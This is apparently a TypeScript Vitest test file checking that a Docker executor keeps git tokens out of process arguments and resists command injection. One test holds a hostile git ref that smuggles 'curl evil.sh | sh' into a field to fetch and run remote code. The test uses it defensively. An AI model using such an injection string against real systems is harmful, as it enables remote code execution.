import { EventEmitter } from "events";
import { beforeEach, describe, expect, it, vi } from "vitest";

const spawnMock = vi.fn();
const execFileMock = vi.fn();

vi.mock("child_process", () => ({
  spawn: (...args: unknown[]) => spawnMock(...args),
  execFile: (...args: unknown[]) => execFileMock(...args),
}));

const { DockerExecutor } = await import("../docker.js");

const TOKEN = "ghs_supersecrettoken000000000000000000";

/** A spawn() stub that completes successfully and records how it was called. */
function stubSpawn() {
  spawnMock.mockImplementation(() => {
    const child = new EventEmitter() as EventEmitter & {
      stdout: EventEmitter;
      stderr: EventEmitter;
      kill: () => void;
    };
    child.stdout = new EventEmitter();
    child.stderr = new EventEmitter();
    child.kill = () => {};
    queueMicrotask(() => child.emit("close", 0));
    return child;
  });
}

/** execFile is promisified, so it must call back node-style. */
function stubExecFile(stdout = "container123\n") {
  execFileMock.mockImplementation((_cmd: string, _args: string[], cb: unknown) => {
    (cb as (e: null, r: { stdout: string; stderr: string }) => void)(null, { stdout, stderr: "" });
  });
}

async function readyExecutor() {
  stubSpawn();
  stubExecFile();
  const executor = new DockerExecutor();
  await executor.init();
  spawnMock.mockClear();
  return executor;
}

/** Every argv array docker was invoked with. */
function spawnArgs(): string[][] {
  return spawnMock.mock.calls.map((c) => c[1] as string[]);
}

beforeEach(() => {
  spawnMock.mockReset();
  execFileMock.mockReset();
});

describe("DockerExecutor.exec env handling", () => {
  it("passes env by NAME on argv and the value only via the child environment", async () => {
    const executor = await readyExecutor();
    await executor.exec("echo hi", { env: { GIT_PASSWORD: TOKEN } });

    const [args, opts] = spawnMock.mock.calls[0] as [string, string[], { env: NodeJS.ProcessEnv }];
    void args;
    const argv = spawnMock.mock.calls[0][1] as string[];
    const options = spawnMock.mock.calls[0][2] as { env: NodeJS.ProcessEnv };

    // The name is on argv so docker knows to forward it...
    expect(argv).toContain("-e");
    expect(argv).toContain("GIT_PASSWORD");
    // ...but the value must never be, or it shows up in `ps`.
    expect(argv.join(" ")).not.toContain(TOKEN);
    expect(options.env.GIT_PASSWORD).toBe(TOKEN);
    void opts;
  });

  it("adds no -e flags when no env is supplied", async () => {
    const executor = await readyExecutor();
    await executor.exec("echo hi");
    expect(spawnMock.mock.calls[0][1] as string[]).not.toContain("-e");
  });

  it("forwards several env names", async () => {
    const executor = await readyExecutor();
    await executor.exec("echo hi", { env: { A: "1", B: "2" } });
    const argv = spawnMock.mock.calls[0][1] as string[];
    expect(argv.filter((a) => a === "-e")).toHaveLength(2);
    expect(argv).toContain("A");
    expect(argv).toContain("B");
  });
});

describe("DockerExecutor.cloneRepo", () => {
  it("never puts the token in any docker argv", async () => {
    const executor = await readyExecutor();
    await executor.cloneRepo("https://github.com/o/r.git", "/workspace/repos/o_r", {
      ref: "main",
      username: "x-access-token",
      password: TOKEN,
    });

    expect(spawnMock).toHaveBeenCalled();
    for (const argv of spawnArgs()) {
      expect(argv.join(" ")).not.toContain(TOKEN);
    }
  });

  it("keeps a hostile ref out of the command string", async () => {
    const executor = await readyExecutor();
    const ref = 'main" ; curl evil.sh | sh ; "';
    await executor.cloneRepo("u", "d", { ref, password: TOKEN });

    for (const argv of spawnArgs()) {
      expect(argv.join(" ")).not.toContain("curl evil.sh");
    }
  });

  it("writes the askpass helper and marks it executable", async () => {
    const executor = await readyExecutor();
    await executor.cloneRepo("u", "d", { password: TOKEN });
    const all = spawnArgs()
      .map((a) => a.join(" "))
      .join("\n");
    expect(all).toContain("git-askpass.sh");
    expect(all).toContain("chmod +x");
  });

  it("throws when git exits non-zero", async () => {
    const executor = await readyExecutor();
    spawnMock.mockImplementation(() => {
      const child = new EventEmitter() as EventEmitter & {
        stdout: EventEmitter;
        stderr: EventEmitter;
        kill: () => void;
      };
      child.stdout = new EventEmitter();
      child.stderr = new EventEmitter();
      child.kill = () => {};
      queueMicrotask(() => {
        child.stdout.emit("data", Buffer.from("fatal: repository not found"));
        child.emit("close", 1);
      });
      return child;
    });
    await expect(executor.cloneRepo("u", "d", { password: TOKEN })).rejects.toThrow(
      /repository not found/,
    );
  });

  it("reports native git support", async () => {
    const executor = await readyExecutor();
    expect(executor.hasNativeGit()).toBe(true);
  });
});
